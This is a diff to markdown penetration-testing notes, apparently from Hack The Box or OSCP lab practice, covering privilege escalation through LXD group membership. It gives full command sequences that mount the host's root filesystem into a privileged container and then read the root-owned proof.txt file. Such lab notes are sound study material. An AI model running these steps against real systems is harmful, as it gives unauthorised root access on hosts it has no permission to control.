@@ -28,7 +28,7 @@ After the image is built it can be added as an image to LXD as follows:
 ## LXD group privilege escalation
 Source (method-1): https://academy.hackthebox.com/module/51/section/477
 
-Source (method-2): https://academy.hackthebox.com/module/51/section/1588
+Source (method-2): https://falconspy.medium.com/infosec-prep-oscp-vulnhubwalkthrough-a09519236025
 
 - Confirm the group
 `id`
@@ -37,7 +37,7 @@ Source (method-2): https://academy.hackthebox.com/module/51/section/1588
 ```
 git clone https://github.com/ertaku12/lxd-alpine-builder.git
 
-cd lxd-alpine-builder
+cd lxd-alpine-builder/
 ```
 
 - Find the binary
@@ -65,25 +65,33 @@ lxc exec r00t /bin/sh
 # id
 uid=0(root) gid=0(root)
 
+cd /mnt/root/root
+cat proof.txt
 ```
 
 - Exploit method-2
 ```bash
-lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias ubuntutemp
+lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias trenchesofit
 
 lxc image list
 
-lxc init ubuntutemp privesc -c security.privileged=true
+lxc storage create pool dir
 
-lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc profile device add default root disk path=/ pool=pool
 
-lxc start privesc
+lxc init trenchesofit ignite -c security.privileged=true
 
-lxc exec privesc /bin/bash
+lxc config device add ignite trenches disk source=/ path=/mnt/root recursive=true
+
+lxc start ignite
+
+lxc exec ignite /bin/sh
 
 # id
 uid=0(root) gid=0(root)
 
+cd /mnt/root/root
+cat proof.txt
 ```
 
 
